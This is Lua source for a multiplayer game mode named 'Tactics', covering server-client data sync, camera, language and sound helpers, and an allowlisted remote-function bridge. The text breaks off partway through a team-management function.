(function(...)
    if localPlayer == nil then
        local tacticsElement = createElement("Tactics", "Tactics");
        setElementData(tacticsElement, "version", "1.2 r20");
        do
            local serverTacticsRef = tacticsElement;
            getAllTacticsData = function()
                return getElementData(serverTacticsRef, "AllData") or {};
            end;
            getTacticsData = function(...)
                local shouldParseData = true;
                local argumentsArray = {...};
                if type(argumentsArray[#argumentsArray]) == "boolean" then
                    shouldParseData = table.remove(argumentsArray);
                end;
                if #argumentsArray == 1 then
                    local retrievedData = getElementData(serverTacticsRef, argumentsArray[1]);
                    if shouldParseData and type(retrievedData) == "string" and string.find(retrievedData, "|") then
                        return gettok(retrievedData, 1, string.byte("|")), split(gettok(retrievedData, 2, string.byte("|")), ",");
                    else
                        return retrievedData;
                    end;
                elseif #argumentsArray > 1 then
                    local nestedData = nil;
                    for currentIndex, currentKey in ipairs(argumentsArray) do
                        if currentIndex == 1 then
                            nestedData = getElementData(serverTacticsRef, currentKey);
                        else
                            nestedData = nestedData[currentKey];
                        end;
                        if not nestedData then
                            return nil;
                        end;
                    end;
                    if shouldParseData and type(nestedData) == "string" and string.find(nestedData, "|") then
                        return gettok(nestedData, 1, string.byte("|")), split(gettok(nestedData, 2, string.byte("|")), ",");
                    else
                        return nestedData;
                    end;
                else
                    return nil;
                end;
            end;
            getDataType = function(dataToCheck) 
                if type(dataToCheck) == "string" then
                    if string.find(dataToCheck, "|") then
                        return "parameter";
                    elseif string.find(dataToCheck, ":") then
                        return "time";
                    elseif dataToCheck == "true" or dataToCheck == "false" then
                        return "toggle";
                    end;
                end;
                return type(dataToCheck);
            end;
            setTacticsData = function(valueToSet, ...) 
                local mergeWithExisting = false;
                local pathArguments = {...};
                if type(pathArguments[#pathArguments]) == "boolean" then
                    mergeWithExisting = table.remove(pathArguments);
                end;
                local previousValue = nil;
                local dataHierarchy = {};
                if #pathArguments > 1 then
                    dataHierarchy[1] = getElementData(serverTacticsRef, pathArguments[1]);
                    if type(dataHierarchy[1]) ~= "table" then
                        dataHierarchy[1] = {};
                    end;
                    for depthIndex = 2, #pathArguments - 1 do
                        dataHierarchy[depthIndex] = type(dataHierarchy[depthIndex - 1][pathArguments[depthIndex]]) == "table" and dataHierarchy[depthIndex - 1][pathArguments[depthIndex]] or {};
                    end;
                    if type(valueToSet) == "table" or dataHierarchy[#pathArguments - 1][pathArguments[#pathArguments]] ~= valueToSet then
                        previousValue = dataHierarchy[#pathArguments - 1][pathArguments[#pathArguments]];
                        if mergeWithExisting and getDataType(previousValue) == "parameter" then
                            dataHierarchy[#pathArguments - 1][pathArguments[#pathArguments]] = tostring(valueToSet) .. string.sub(previousValue, string.find(previousValue, "|"), -1);
                        elseif type(valueToSet) == "string" then
                            dataHierarchy[#pathArguments - 1][pathArguments[#pathArguments]] = tostring(valueToSet);
                        else
                            dataHierarchy[#pathArguments - 1][pathArguments[#pathArguments]] = valueToSet;
                        end;
                        for reverseIndex = #pathArguments - 1, 2, -1 do
                            dataHierarchy[reverseIndex - 1][pathArguments[reverseIndex]] = dataHierarchy[reverseIndex];
                        end;
                    else
                        return false;
                    end;
                elseif #pathArguments == 1 then
                    if type(valueToSet) == "table" or getElementData(serverTacticsRef, pathArguments[1]) ~= valueToSet then
                        previousValue = getElementData(serverTacticsRef, pathArguments[1]);
                        if mergeWithExisting and getDataType(previousValue) == "parameter" then
                            dataHierarchy[1] = tostring(valueToSet) .. string.sub(previousValue, string.find(previousValue, "|"), -1);
                        elseif type(valueToSet) == "string" then
                            dataHierarchy[1] = tostring(valueToSet);
                        else
                            dataHierarchy[1] = valueToSet;
                        end;
                    else
                        return false;
                    end;
                else
                    return false;
                end;
                setElementData(serverTacticsRef, pathArguments[1], dataHierarchy[1]);
                triggerEvent("onTacticsChange", root, pathArguments, previousValue);
                return true;
            end;
            addEvent("onTacticsChange");
            addEvent("onSetTacticsData", true);
            addEventHandler("onSetTacticsData", resourceRoot, function(clientValue, ...) 
                if hasObjectPermissionTo(client, "general.tactics_players") then
                    setTacticsData(clientValue, ...);
                end
            end);
        end;
    else
        local clientTacticsElement = getElementByID("Tactics");
        do
            local clientTacticsRef = clientTacticsElement;
            initTacticsData = function()
                local currentPath = {};
                local function compareTablesRecursive(newTable, oldTable, currentDepth)
                    for tableKey, tableValue in pairs(newTable) do
                        currentPath[currentDepth] = tableKey;
                        if type(tableValue) == "table" and #tableValue == 0 and type(next(tableValue)) == "string" then
                            compareTablesRecursive(tableValue, oldTable[tableKey] or {}, currentDepth + 1);
                            currentPath[currentDepth + 1] = nil;
                        elseif type(oldTable[tableKey]) == "table" or tableValue ~= oldTable[tableKey] then
                            triggerEvent("onClientTacticsChange", clientTacticsRef, currentPath, oldTable[tableKey]);
                        end;
                        oldTable[tableKey] = nil;
                    end;
                    for remainingKey, remainingValue in pairs(oldTable) do
                        currentPath[currentDepth] = remainingKey;
                        if type(newTable[remainingKey]) == "table" and #newTable[remainingKey] == 0 and type(next(newTable[remainingKey])) == "string" then
                            compareTablesRecursive(newTable[remainingKey], remainingValue or {}, currentDepth + 1);
                            currentPath[currentDepth + 1] = nil;
                        elseif type(remainingValue) == "table" or newTable[remainingKey] ~= remainingValue then
                            triggerEvent("onClientTacticsChange", clientTacticsRef, currentPath, remainingValue);
                        end;
                    end;
                end;
                for _, dataKey in ipairs(getAllTacticsData()) do
                    local keyData = getElementData(clientTacticsRef, dataKey);
                    currentPath[1] = dataKey;
                    if type(keyData) == "table" and #keyData == 0 and type(next(keyData)) == "string" then
                        compareTablesRecursive(keyData, {}, 2);
                        currentPath[2] = nil;
                    else
                        triggerEvent("onClientTacticsChange", clientTacticsRef, currentPath, nil);
                    end;
                end;
            end;
            addEvent("onDownloadComplete");
            addEventHandler("onDownloadComplete", root, initTacticsData);
            local function handleElementDataChange(dataKey, oldData) 
                local changePath = {};
                local function processDataChange(changedTable, comparisonTable, processingDepth) 
                    for changedKey, changedValue in pairs(changedTable) do
                        changePath[processingDepth] = changedKey;
                        if type(changedValue) == "table" and #changedValue == 0 and type(next(changedValue)) == "string" then
                            processDataChange(changedValue, comparisonTable[changedKey] or {}, processingDepth + 1);
                            changePath[processingDepth + 1] = nil;
                        elseif type(comparisonTable[changedKey]) == "table" or changedValue ~= comparisonTable[changedKey] then
                            triggerEvent("onClientTacticsChange", source, changePath, comparisonTable[changedKey]);
                        end;
                        comparisonTable[changedKey] = nil;
                    end;
                    for comparisonKey, comparisonValue in pairs(comparisonTable) do
                        changePath[processingDepth] = comparisonKey;
                        if type(changedTable[comparisonKey]) == "table" and #changedTable[comparisonKey] == 0 and type(next(changedTable[comparisonKey])) == "string" then
                            processDataChange(changedTable[comparisonKey], comparisonValue or {}, processingDepth + 1);
                            changePath[processingDepth + 1] = nil;
                        elseif type(comparisonValue) == "table" or changedTable[comparisonKey] ~= comparisonValue then
                            triggerEvent("onClientTacticsChange", source, changePath, comparisonValue);
                        end;
                    end;
                end;
                local elementDataValue = getElementData(source, dataKey);
                changePath[1] = dataKey;
                if type(elementDataValue) == "table" and #elementDataValue == 0 and type(next(elementDataValue)) == "string" then
                    processDataChange(elementDataValue, oldData or {}, 2);
                    changePath[2] = nil;
                else
                    triggerEvent("onClientTacticsChange", source, changePath, oldData);
                end;
            end;
            addEvent("onClientTacticsChange");
            addEventHandler("onClientElementDataChange", clientTacticsRef, handleElementDataChange);
            getAllTacticsData = function() 
                return getElementData(clientTacticsRef, "AllData") or {};
            end;
            getTacticsData = function(...) 
                local parseDataFlag = true;
                local clientArgs = {...};
                if type(clientArgs[#clientArgs]) == "boolean" then
                    parseDataFlag = table.remove(clientArgs);
                end;
                if #clientArgs == 1 then
                    local clientData = getElementData(clientTacticsRef, clientArgs[1]);
                    if parseDataFlag and type(clientData) == "string" and string.find(clientData, "|") then
                        return gettok(clientData, 1, string.byte("|")), split(gettok(clientData, 2, string.byte("|")), ",");
                    else
                        return clientData;
                    end;
                elseif #clientArgs > 1 then
                    local nestedClientData = nil;
                    for argIndex, argValue in ipairs(clientArgs) do
                        if argIndex == 1 then
                            nestedClientData = getElementData(clientTacticsRef, argValue);
                        else
                            nestedClientData = nestedClientData[argValue];
                        end;
                        if not nestedClientData then
                            return nil;
                        end;
                    end;
                    if parseDataFlag and type(nestedClientData) == "string" and string.find(nestedClientData, "|") then
                        return gettok(nestedClientData, 1, string.byte("|")), split(gettok(nestedClientData, 2, string.byte("|")), ",");
                    else
                        return nestedClientData;
                    end;
                else
                    return nil;
                end;
            end;
            getDataType = function(inputData) 
                if type(inputData) == "string" then
                    if string.find(inputData, "|") then
                        return "parameter";
                    elseif string.find(inputData, ":") then
                        return "time";
                    elseif inputData == "true" or inputData == "false" then
                        return "toggle";
                    end;
                end;
                return type(inputData);
            end;
            setTacticsData = function(valueForServer, ...) 
                triggerServerEvent("onSetTacticsData", resourceRoot, valueForServer, ...);
            end;
        end;
    end;
    if triggerServerEvent ~= nil then
        local screenWidth, screenHeight = guiGetScreenSize();
        yscreen = screenHeight;
        xscreen = screenWidth;
        white = tocolor(255, 255, 255);
        whiteC0 = tocolor(255, 255, 255, 192);
        silver = tocolor(225, 225, 225);
        black = tocolor(0, 0, 0);
        blackC0 = tocolor(0, 0, 0, 192);
        black80 = tocolor(0, 0, 0, 128);
        black60 = tocolor(0, 0, 0, 96);
        blueC0 = tocolor(0, 192, 255, 192);
        darkblueC0 = tocolor(0, 96, 128, 192);
        greyE1 = tocolor(192, 192, 192, 225);
        setCameraPrepair = function(cameraHeight, cameraX, cameraY, cameraZ) 
            if not cameraX or not cameraY or not cameraZ then
                local centralMarker = getElementsByType("Central_Marker")[1];
                if isElement(centralMarker) then
                    local markerX, markerY, markerZ = getElementPosition(centralMarker);
                    cameraZ = markerZ;
                    cameraY = markerY;
                    cameraX = markerX;
                else
                    local playerX, playerY, playerZ = getElementPosition(localPlayer);
                    cameraZ = playerZ;
                    cameraY = playerY;
                    cameraX = playerX;
                end;
            end;
            if not cameraHeight then
                cameraHeight = 70;
            end;
            setCameraMatrix(cameraX, cameraY, cameraZ, cameraX, cameraY, cameraZ + cameraHeight);
            setElementData(localPlayer, "Prepair", {cameraX, cameraY, cameraZ, cameraHeight}, false);
            return true;
        end;
        stopCameraPrepair = function() 
            if setElementData(localPlayer, "Prepair", nil, false) then
                setCameraTarget(localPlayer);
            end;
        end;
        getFont = function(fontSize) 
            return tonumber(0.015 * fontSize * yscreen / 9);
        end;
        getPlayerLanguage = function() 
            if not isElement(config_gameplay_language) then
                return "language/english.lng";
            else
                local selectedLanguage = guiGetText(config_gameplay_language);
                return selectedLanguage and config_gameplay_languagelist[selectedLanguage] or "language/english.lng";
            end;
        end;
        setPlayerLanguage = function(languageFile) 
            if config_gameplay_languagelist[guiGetText(config_gameplay_language)] == languageFile then
                return false;
            else
                local languageXML = xmlLoadFile(languageFile);
                if languageXML then
                    loadedLanguage = {};
                    local languageName = xmlNodeGetAttribute(languageXML, "name") or "";
                    local languageAuthor = xmlNodeGetAttribute(languageXML, "author") or "";
                    outputChatBox(languageName .. " (" .. languageAuthor .. ")", 255, 100, 100, true);
                    for _, languageNode in ipairs(xmlNodeGetChildren(languageXML)) do
                        loadedLanguage[xmlNodeGetName(languageNode)] = xmlNodeGetAttribute(languageNode, "string");
                    end;
                    xmlUnloadFile(languageXML);
                    local gameplayNode = xmlFindChild(_client, "gameplay", 0);
                    xmlNodeSetAttribute(gameplayNode, "language", languageFile);
                    xmlSaveFile(_client);
                    if not config_gameplay_languagelist[languageFile] then
                        config_gameplay_languagelist[languageFile] = languageName;
                    end;
                    if not config_gameplay_languagelist[languageName] then
                        config_gameplay_languagelist[languageName] = languageFile;
                    end;
                    guiSetText(config_gameplay_language, languageName);
                    triggerEvent("onClientLanguageChange", localPlayer, languageFile);
                    return true;
                else
                    return false;
                end;
            end;
        end;
        getLanguageString = function(stringKey) 
            if type(loadedLanguage) ~= "table" then
                loadedLanguage = {};
                local currentLanguageFile = getPlayerLanguage();
                local languageFileXML = xmlLoadFile(currentLanguageFile);
                if languageFileXML then
                    for _, stringNode in ipairs(xmlNodeGetChildren(languageFileXML)) do
                        loadedLanguage[xmlNodeGetName(stringNode)] = xmlNodeGetAttribute(stringNode, "string");
                    end;
                    xmlUnloadFile(languageFileXML);
                end;
            end;
            return loadedLanguage[tostring(stringKey)] or "";
        end;
        outputLangString = function(outputStringKey, ...) 
            local formatArgs = {...};
            if #formatArgs > 0 then
                outputChatBox(string.format(getLanguageString(tostring(outputStringKey)), unpack(formatArgs)), 255, 100, 100, true);
            else
                outputChatBox(getLanguageString(tostring(outputStringKey)), 255, 100, 100, true);
            end;
        end;
        isAllGuiHidden = function() 
            if getElementData(localPlayer, "Status") == "Joining" then
                return false;
            else
                for _, guiWindow in ipairs(getElementsByType("gui-window", resourceRoot)) do
                    if guiGetVisible(guiWindow) and guiWindow ~= voting_window then
                        return false;
                    end;
                end;
                return true;
            end;
        end;
        isRoundPaused = function() 
            if getTacticsData("Pause") then
                local unpauseTime = getTacticsData("Unpause");
                if unpauseTime then
                    return true, unpauseTime - (getTickCount() + addTickCount);
                else
                    return true;
                end;
            else
                return false;
            end;
        end;
        voiceThread = {};
        playVoice = function(voiceFile, voiceLoop, voiceVolume, voiceSpeed) 
            if not guiCheckBoxGetSelected(config_audio_voice) then
                return false;
            elseif isElement(voiceThread[voiceFile]) then
                return voiceThread[voiceFile];
            else
                voiceThread[voiceFile] = playSound(voiceFile, voiceLoop or false);
                if not voiceVolume then
                    voiceVolume = 0.01 * guiScrollBarGetScrollPosition(config_audio_voicevol);
                else
                    voiceVolume = math.min(voiceVolume, 0.01 * guiScrollBarGetScrollPosition(config_audio_voicevol));
                end;
                setSoundVolume(voiceThread[voiceFile], voiceVolume);
                setSoundSpeed(voiceThread[voiceFile], voiceSpeed or 1);
                return voiceThread[voiceFile];
            end;
        end;
        musicThread = {};
        playMusic = function(musicFile, musicLoop, musicVolume) 
            if not guiCheckBoxGetSelected(config_audio_voice) then
                return false;
            elseif isElement(musicThread[musicFile]) then
                return musicThread[musicFile];
            else
                musicThread[musicFile] = playSound(musicFile, musicLoop or false);
                if not musicVolume then
                    musicVolume = 0.01 * guiScrollBarGetScrollPosition(config_audio_musicvol);
                else
                    musicVolume = math.min(musicVolume, 0.01 * guiScrollBarGetScrollPosition(config_audio_musicvol));
                end;
                setSoundVolume(musicThread[musicFile], not musicVolume and 1 or musicVolume);
                setSoundSpeed(musicThread[musicFile], speed or 1);
                return musicThread[musicFile];
            end;
        end;
        getAngleBetweenPoints2D = function(x1, y1, x2, y2) 
            local calculatedAngle = 0 - math.deg(math.atan2(x2 - x1, y2 - y1));
            if calculatedAngle < 0 then
                calculatedAngle = calculatedAngle + 360;
            end;
            return calculatedAngle;
        end;
        getAngleBetweenAngles2D = function(angle1, angle2) 
            local angleDifference;
            if angle1 < angle2 then
                if angle1 < angle2 - 180 then
                    angleDifference = angle1 - (angle2 - 360);
                else
                    angleDifference = angle1 - angle2;
                end;
            elseif angle2 + 180 < angle1 then
                angleDifference = angle1 - (angle2 + 360);
            else
                angleDifference = angle1 - angle2;
            end;
            return angleDifference;
        end;
        replaceCustom = {};
        loadCustomObject = function(objectModel, textureFile, modelFile) 
            local customObject = {model = objectModel};
            local importSuccess = false;
            if textureFile then
                customObject.txd = engineLoadTXD(textureFile);
                importSuccess = engineImportTXD(customObject.txd, objectModel);
            end;
            if modelFile then
                customObject.dff = engineLoadDFF(modelFile, objectModel);
                importSuccess = engineReplaceModel(customObject.dff, objectModel);
            end;
            if importSuccess then
                table.insert(replaceCustom, customObject);
            end;
            return importSuccess;
        end;
        addEventHandler("onClientMapStopping", root, function() 
            for _, customObjectEntry in ipairs(replaceCustom) do
                if customObjectEntry.txd and isElement(customObjectEntry.txd) then
                    destroyElement(customObjectEntry.txd);
                end;
                if customObjectEntry.dff and isElement(customObjectEntry.dff) then
                    destroyElement(customObjectEntry.dff);
                    engineRestoreModel(customObjectEntry.model);
                end;
            end;
            replaceCustom = {};
        end);
        getElementVector = function(targetElement, offsetX, offsetY, offsetZ, relativeOffset) 
            if not isElement(targetElement) then
                return false;
            else
                local elementMatrix = getElementMatrix(targetElement);
                local resultVector = {};
                if not relativeOffset then
                    resultVector[1] = offsetX * elementMatrix[1][1] + offsetY * elementMatrix[2][1] + offsetZ * elementMatrix[3][1] + elementMatrix[4][1];
                    resultVector[2] = offsetX * elementMatrix[1][2] + offsetY * elementMatrix[2][2] + offsetZ * elementMatrix[3][2] + elementMatrix[4][2];
                    resultVector[3] = offsetX * elementMatrix[1][3] + offsetY * elementMatrix[2][3] + offsetZ * elementMatrix[3][3] + elementMatrix[4][3];
                else
                    resultVector[1] = offsetX * elementMatrix[1][1] + offsetY * elementMatrix[2][1] + offsetZ * elementMatrix[3][1];
                    resultVector[2] = offsetX * elementMatrix[1][2] + offsetY * elementMatrix[2][2] + offsetZ * elementMatrix[3][2];
                    resultVector[3] = offsetX * elementMatrix[1][3] + offsetY * elementMatrix[2][3] + offsetZ * elementMatrix[3][3];
                end;
                return resultVector;
            end;
        end;
        callServerFunction = function(functionName, ...) 
            local functionArgs = {...};
            if functionArgs[1] then
                for argPosition, argItem in next, functionArgs do
                    if type(argItem) == "number" then
                        functionArgs[argPosition] = tostring(argItem);
                    end;
                end;
            end;
            triggerServerEvent("onClientCallsServerFunction", root, functionName, unpack(functionArgs));
        end;
        callClientFunction = function(clientFunction, ...) 
            local clientArgs = {...};
            if clientArgs[1] then
                for clientArgIndex, clientArgValue in next, clientArgs do
                    clientArgs[clientArgIndex] = tonumber(clientArgValue) or clientArgValue;
                end;
            end;
            loadstring("return " .. clientFunction)()(unpack(clientArgs));
        end;
        addEvent("onServerCallsClientFunction", true);
        addEventHandler("onServerCallsClientFunction", root, callClientFunction);
        addEvent("onClientLanguageChange");
        addEvent("onOutputLangString", true);
        addEventHandler("onOutputLangString", root, outputLangString);
    else
        outputLangString = function(targetPlayer, langStringKey, ...) 
            triggerClientEvent(targetPlayer, "onOutputLangString", root, langStringKey, ...);
        end;
        getString = function(serverStringKey) 
            if not serverLanguage then
                serverLanguage = {};
                local serverLanguageXML = xmlLoadFile("language/english.lng");
                if serverLanguageXML then
                    for _, serverStringNode in ipairs(xmlNodeGetChildren(serverLanguageXML)) do
                        serverLanguage[xmlNodeGetName(serverStringNode)] = xmlNodeGetAttribute(serverStringNode, "string");
                    end;
                end;
            end;
            return serverLanguage[tostring(serverStringKey)] or "";
        end;
        setCameraPrepair = function(playerElement, prepairHeight, prepairX, prepairY, prepairZ) 
            if not prepairX or not prepairY or not prepairZ then
                local serverCentralMarker = getElementsByType("Central_Marker")[1];
                if isElement(serverCentralMarker) then
                    local serverMarkerX, serverMarkerY, serverMarkerZ = getElementPosition(serverCentralMarker);
                    prepairZ = serverMarkerZ;
                    prepairY = serverMarkerY;
                    prepairX = serverMarkerX;
                else
                    local serverPlayerX, serverPlayerY, serverPlayerZ = getElementPosition(playerElement);
                    prepairZ = serverPlayerZ;
                    prepairY = serverPlayerY;
                    prepairX = serverPlayerX;
                end;
            end;
            if not prepairHeight then
                prepairHeight = 70;
            end;
            setCameraMatrix(playerElement, prepairX, prepairY, prepairZ, prepairX, prepairY, prepairZ + prepairHeight);
            setElementData(playerElement, "Prepair", {prepairX, prepairY, prepairZ, prepairHeight});
        end;
        stopCameraPrepair = function(playerToStop) 
            if setElementData(playerToStop, "Prepair", nil) then
                setCameraTarget(playerToStop, playerToStop);
            end;
        end;
        setCameraSpectating = function(spectatePlayer, ...) 
            if spectatePlayer and isElement(spectatePlayer) then
                callClientFunction(spectatePlayer, "setCameraSpectating", ...);
                return true;
            else
                return false;
            end;
        end;
        isRoundPaused = function() 
            if getTacticsData("Pause") then
                local serverUnpauseTime = getTacticsData("Unpause");
                if serverUnpauseTime then
                    return true, serverUnpauseTime - getTickCount();
                else
                    return true;
                end;
            else
                return false;
            end;
        end;
        createMapVehicle = function(vehicleModel, vehicleX, vehicleY, vehicleZ, vehicleRotX, vehicleRotY, vehicleRotZ) 
            local createdVehicle = createVehicle(vehicleModel, vehicleX, vehicleY, vehicleZ, vehicleRotX, vehicleRotY, vehicleRotZ);
            setElementParent(createdVehicle, getRoundMapDynamicRoot());
            return createdVehicle;
        end;

        callClientFunction = function(targetElementOrTable, serverFunctionName, ...)
            if not targetElementOrTable or (type(targetElementOrTable) ~= "table" and not isElement(targetElementOrTable) and targetElementOrTable ~= root and targetElementOrTable ~= getRootElement()) then
                return false;
            end;
            if not serverFunctionName or type(serverFunctionName) ~= "string" or serverFunctionName == "" then
                return false;
            end;   
            local serverFunctionArgs = {...};
            if serverFunctionArgs[1] then
                for serverArgIndex, serverArgValue in next, serverFunctionArgs do
                    if type(serverArgValue) == "number" then
                        serverFunctionArgs[serverArgIndex] = tostring(serverArgValue);
                    end;
                end;
            end;  
            local sourceElement = targetElementOrTable;
            if type(sourceElement) == "table" then
                for _, element in pairs(sourceElement) do
                    if isElement(element) then
                        sourceElement = element;
                    break;
                end;
            end;
            if not isElement(sourceElement) and sourceElement ~= root and sourceElement ~= getRootElement() then
                sourceElement = root;
                end;
            end;  
            local success, result = pcall(function()
                return triggerClientEvent(targetElementOrTable, "onServerCallsClientFunction", sourceElement, serverFunctionName, unpack(serverFunctionArgs or {}));
            end);
            if not success then
                return false;
            end;
            return result;
        end;

        local allowedFunctions = {
            ["kickPlayer"] = true,
            ["onPlayerWeaponpackChose"] = true,
            ["warpPlayerToJoining"] = true,
            ["onPlayerVehicleSelect"] = true,
            ["killPed"] = true,
            ["callClientFunction"] = true,
            ["forceRespawnPlayer"] = true,
            ["reloadPedWeapon"] = true,
            ["refreshMaps"] = true,
            ["showAdminPanel"] = true,
            ["refreshConfiglist"] = true,
            ["onPlayerCheckUpdates"] = true,
            ["balanceTeams"] = true,
            ["setElementData"] = true,
            ["setElementHealth"] = true,
            ["fixVehicle"] = true,
            ["swapTeams"] = true,
            ["removePlayer"] = true,
            ["addPlayer"] = true,
            ["restorePlayer"] = true,
            ["restorePlayerLoad"] = true,
            ["setNextMap"] = true,
            ["cancelNextMap"] = true,
            ["onRoundStop"] = true,
            ["resetStats"] = true,
            ["connectPlayers"] = true,
            ["removeServerTeam"] = true,
            ["saveTeamsConfig"] = true,
            ["addServerTeam"] = true,
            ["renameConfig"] = true,
            ["addConfig"] = true,
            ["saveConfig"] = true,
            ["deleteConfig"] = true,
            ["changeWeaponProperty"] = true,
            ["resetWeaponProperty"] = true,
            ["changeVehicleHandling"] = true,
            ["resetVehicleHandling"] = true,
            ["addAnticheatModsearch"] = true,
            ["setAnticheatModsearch"] = true,
            ["removeAnticheatModsearch"] = true,
            ["takePlayerScreenShot"] = true,
            ["startMap"] = true,
            ["startConfig"] = true,
            ["executeClientRuncode"] = true,
            ["stopClientRuncode"] = true,
            ["outputChatBox"] = true,
            ["toggleGangDriveby"] = true,
            ["doPunishment"] = true,
            ["pickupWeapon"] = true,
            ["replaceWeapon"] = true,
            ["dropWeapon"] = true,
            ["removeVehicleUpgrade"] = true,
            ["addVehicleUpgrade"] = true,
            ["nitroLevel"] = true,
        }

        local specifyFunctions = {
            ["setElementHealth"] = true,
            ["addConfig"] = true,
            ["removeServerTeam"] = true,
            ["addPlayer"] = true,
            ["deleteConfig"] = true,
            ["removePlayer"] = true,
            ["saveConfig"] = true,
            ["addServerTeam"] = true,
            ["swapTeams"] = true,
            ["saveTeamsConfig"] = true,
            ["resetStats"] = true,
            ["setElementData"] = true,
            ["startConfig"] = true,
            ["startMap"] = true,
            ["renameConfig"] = true,
            ["addAnticheatModsearch"] = true,
            ["setAnticheatModsearch"] = true,
            ["removeAnticheatModsearch"] = true,
            ["balanceTeams"] = true,
        }

        callServerFunction = function(functionName, ...)
            local isFunctionAllowed = false
            
            if allowedFunctions[functionName] then
                isFunctionAllowed = true
            end

            if not isFunctionAllowed then
                return false
            end

            local args = { ... }
            if specifyFunctions[functionName] then
                if not hasObjectPermissionTo(client, "general.tactics_openpanel", false) then
                    return
                end
            else
                args[1] = client
            end

            local func = _G[functionName]
            if type(func) ~= "function" then
                return false
            end

            if args[1] then
                for i, arg in next, args do
                    args[i] = tonumber(arg) or arg;
                end
            end

            return func(unpack(args))
        end

        addEvent("onClientCallsServerFunction", true)
        addEventHandler("onClientCallsServerFunction", resourceRoot, callServerFunction)
    end;
    getRoundMapRoot = function(mapResource) 
        if mapResource then
            return getResourceRootElement(mapResource);
        else
            local currentMapResource = getResourceFromName(getTacticsData("MapResName"));
            if currentMapResource then
                return getResourceRootElement(currentMapResource);
            else
                return root;
            end;
        end;
    end;
    getRoundMapDynamicRoot = function(dynamicMapResource) 
        if dynamicMapResource then
            return getResourceDynamicElementRoot(dynamicMapResource);
        else
            local currentDynamicMapResource = getResourceFromName(getTacticsData("MapResName"));
            if currentDynamicMapResource then
                return getResourceDynamicElementRoot(currentDynamicMapResource);
            else
                return root;
            end;
        end;
    end;
    removeColorCoding = function(textToClean) 
        return type(textToClean) == "string" and string.gsub(textToClean, "#%x%x%x%x%x%x", "") or textToClean;
    end;
    TimeToSec = function(timeString) 
        if not string.find(tostring(timeString), ":") then
            return false;
        else
            local timeParts = split(tostring(timeString), string.byte(":"));
            local hours = tonumber(timeParts[#timeParts - 2]) or 0;
            local minutes = tonumber(timeParts[#timeParts - 1]) or 0;
            local seconds = tonumber(timeParts[#timeParts]);
            return 3600 * hours + 60 * minutes + seconds;
        end;
    end;
    MSecToTime = function(milliseconds, decimalPlaces) 
        if type(milliseconds) ~= "number" then
            return false;
        else
            if type(decimalPlaces) ~= "number" then
                decimalPlaces = 1;
            end;
            local timeHours = math.floor(milliseconds / 3600000) or 0;
            local timeMinutes = math.floor(milliseconds / 60000) - timeHours * 60 or 0;
            local timeSeconds = math.floor(milliseconds / 1000) - timeMinutes * 60 - timeHours * 3600 or 0;
            local timeMilliseconds = milliseconds - timeSeconds * 1000 - timeMinutes * 60000 - timeHours * 3600000 or 0;
            local formattedTime = string.format("%02i", timeSeconds);
            if timeHours > 0 then
                formattedTime = string.format("%i:%02i:", timeHours, timeMinutes) .. formattedTime;
            else
                formattedTime = string.format("%i:", timeMinutes) .. formattedTime;
            end;
            if decimalPlaces > 0 then
                local millisecondString = string.sub(string.format("%." .. decimalPlaces .. "f", 0.001 * timeMilliseconds), 2);
                if #millisecondString - 1 < decimalPlaces then
                    millisecondString = millisecondString .. string.rep("0", decimalPlaces - (#millisecondString - 1));
                end;
                formattedTime = formattedTime .. millisecondString;
            end;
            return formattedTime;
        end;
    end;
    string.count = function(mainString, subString) 
        local occurrenceCount = 0;
        local foundPosition = string.find(mainString, subString);
        while foundPosition do
            occurrenceCount = occurrenceCount + 1;
            foundPosition = string.find(mainString, subString, foundPosition + 1);
        end;
        return occurrenceCount;
    end;
    getRoundMapInfo = function() 
        return {
            modename = getTacticsData("Map"), 
            name = getTacticsData("MapName") or "unnamed", 
            author = getTacticsData("MapAuthor"), 
            resname = getTacticsData("MapResName"), 
            mapnext = getTacticsData("ResourceNext")
        };
    end;
    getRoundModeSettings = function(...) 
        local modeArgs = {...};
        local currentMode = getTacticsData("Map");
        local modeSettings = {getTacticsData("modes", currentMode, unpack(modeArgs))};
        if modeSettings[1] then
            return unpack(modeSettings);
        else
            return getTacticsData(unpack(modeArgs));
        end;
    end;
    getUnreadyPlayers = function() 
        local unreadyPlayers = {};
        for _, playerElement in ipairs(getElementsByType("player")) do
            if getElementData(playerElement, "Loading") and getElementData(playerElement, "Status") == "Play" then
                table.insert(unreadyPlayers, playerElement);
            end;
        end;
        if #unreadyPlayers > 1 then
            return unreadyPlayers;
        else
            return unreadyPlayers[1] or false;
        end;
    end;
    getPlayerGameStatus = function(playerToCheck) 
        if not isElement(playerToCheck) then
            return false;
        elseif getElementData(playerToCheck, "Loading") then
            return "Loading";
        else
            return getElementData(playerToCheck, "Status");
        end;
    end;
    getRoundState = function() 
        return (getTacticsData("roundState"));
    end;
end)();
(function(...) 
    wastedTimer = {};
    waitingTimer = nil;
    startTimer = nil;
    winTimer = nil;
    overtimeTimer = nil;
    restartTimer = nil;
    unpauseTimer = nil;
    playersVeh = {};
    addServerTeam = function(teamName, teamSkins, teamColor, teamScore) 
        local teamCount = #getElementsByType("team");
        if not teamName then
            teamName = "Team" .. teamCount;
        end;
        if not teamSkins then
            local randomSkin = math.random(7, 288);
            while randomSkin == 8 or randomSkin == 42 or randomSkin == 65 or randomSkin == 74 or randomSkin == 86 or randomSkin == 119 or randomSkin == 149 or randomSkin == 208 or randomSkin == 239 or randomSkin == 265 or randomSkin == 266 or randomSkin == 267 or randomSkin == 268 or randomSkin == 269 or randomSkin == 270 or randomSkin == 271 or randomSkin == 272 or randomSkin == 273 do
                randomSkin = math.random(7, 288);
            end;
            teamSkins = {randomSkin};
        end;
        if not teamColor then
            teamColor = {math.random(255), math.random(255), math.random(255)};
        end;
        if not teamScore then
            teamScore = 0;
        end;
        local createdTeam = createTeam(teamName, teamColor[1], teamColor[2], teamColor[3]);
        local friendlyFireEnabled = getTacticsData("settings", "friendly_fire") == "true";
        setTeamFriendlyFire(createdTeam, friendlyFireEnabled);
        if teamCount > 0 then
            setElementData(createdTeam, "Skins", teamSkins);
            setElementData(createdTeam, "Score", teamScore);
            setElementData(createdTeam, "Side", teamCount);
            local sidesArray = getTacticsData("Sides");
            if not sidesArray or #sidesArray == 0 then
                sidesArray = {};
            end;
            table.insert(sidesArray, createdTeam);
            setTacticsData(sidesArray, "Sides");
            local teamSidesMap = {};
            for sideIndex, sideTeam in ipairs(sidesArray) do
                teamSidesMap[sideTeam] = sideIndex;
            end;
            setTacticsData(teamSidesMap, "Teamsides");
        end;
        return createdTeam;
    end;
    removeServerTeam = function(teamToRemove) 
        if #getElementsByType("team") <= 1 then
            return false;
        else
